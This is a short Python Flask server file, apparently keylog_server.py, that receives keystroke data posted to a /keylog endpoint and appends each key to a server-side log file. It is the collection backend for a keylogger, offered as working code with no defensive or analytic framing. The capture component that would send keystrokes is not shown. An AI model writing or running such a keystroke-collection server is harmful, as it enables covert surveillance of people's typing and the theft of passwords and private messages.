from flask import Flask, request

app = Flask(__name__)

# Endpoint to receive key logs
# Flask endpoint should look like this in keylog_server.py
@app.route('/keylog', methods=['POST'])

def keylog():
    key_data = request.form.get('key')
    if key_data:
        # Append the keystroke data to a server-side log file
        with open("server_keylog.txt", "a") as f:
            f.write(f"{key_data}\n")
    return "Logged", 200

if __name__ == "__main__":
    app.run(host='127.0.0.1', port=80)  # Expose on port 80 for HTTP access
